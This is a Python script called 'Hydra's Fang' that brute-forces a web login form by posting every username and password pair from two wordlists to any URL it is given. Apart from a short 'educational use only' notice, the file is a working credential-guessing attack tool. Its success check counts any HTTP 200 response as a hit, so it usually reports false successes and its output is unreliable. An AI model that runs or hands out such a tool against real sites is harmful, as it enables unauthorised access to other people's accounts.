import requests, argparse, time, sys, os
from colorama import Fore, Style

def show_banner():
    art_path = os.path.join("assets", "ascii_art.txt")
    if os.path.exists(art_path):
        with open(art_path, "r") as art:
            print(Fore.RED + art.read() + Style.RESET_ALL)
    else:
        print(Fore.RED + "Hydra's Fang – Brute Force Tool" + Style.RESET_ALL)

def brute_force(url, usernames, passwords):
    print(Fore.MAGENTA + "\n⚠️ This tool is for educational use only. Proceed responsibly.\n" + Style.RESET_ALL)
    input("Press Enter to continue...\n")

    for user in usernames:
        for pwd in passwords:
            payload = {'username': user.strip(), 'password': pwd.strip()}
            try:
                response = requests.post(url, data=payload)
                if "Welcome" in response.text or response.status_code == 200:
                    print(Fore.GREEN + f"[+] Success: {user.strip()}:{pwd.strip()}" + Style.RESET_ALL)
                    return
                else:
                    print(Fore.YELLOW + f"[-] Failed: {user.strip()}:{pwd.strip()}")
            except Exception as e:
                print(Fore.RED + f"[!] Error: {e}")
            time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="Hydra’s Fang – Brute Force Simulator")
    parser.add_argument("--url", required=True, help="Target login URL")
    parser.add_argument("--userlist", required=True, help="Path to usernames file")
    parser.add_argument("--passlist", required=True, help="Path to passwords file")
    args = parser.parse_args()

    try:
        with open(args.userlist) as ufile, open(args.passlist) as pfile:
            usernames = ufile.readlines()
            passwords = pfile.readlines()
    except Exception as e:
        print(Fore.RED + f"Error loading wordlists: {e}")
        sys.exit(1)

    show_banner()
    brute_force(args.url, usernames, passwords)

if __name__ == "__main__":
    main()
    